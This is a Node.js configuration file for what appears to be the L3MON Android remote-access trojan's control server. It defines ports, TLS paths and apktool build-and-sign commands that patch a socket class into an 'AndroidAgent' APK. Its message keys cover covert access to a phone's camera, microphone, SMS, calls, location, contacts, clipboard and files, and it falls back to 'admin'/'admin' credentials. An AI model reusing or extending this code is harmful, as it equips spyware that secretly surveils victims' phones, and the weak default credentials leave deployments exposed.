const path = require('path');

exports.debug = process.env.NODE_ENV !== 'production';

// Security Configuration
exports.security = {
    bcrypt_rounds: process.env.BCRYPT_ROUNDS || 12,
    tls_enabled: process.env.TLS_ENABLED === 'true',
    cert_path: process.env.TLS_CERT_PATH || '/app/certs/fullchain.pem',
    key_path: process.env.TLS_KEY_PATH || '/app/certs/privkey.pem',
    admin_user: process.env.ADMIN_USERNAME || "admin",
    admin_pass: process.env.ADMIN_PASSWORD || "admin" // Will be bcrypted
};

exports.web_port = process.env.WEB_PORT || 22533;
exports.control_port = process.env.CONTROL_PORT || 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/AndroidAgent.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');

exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}
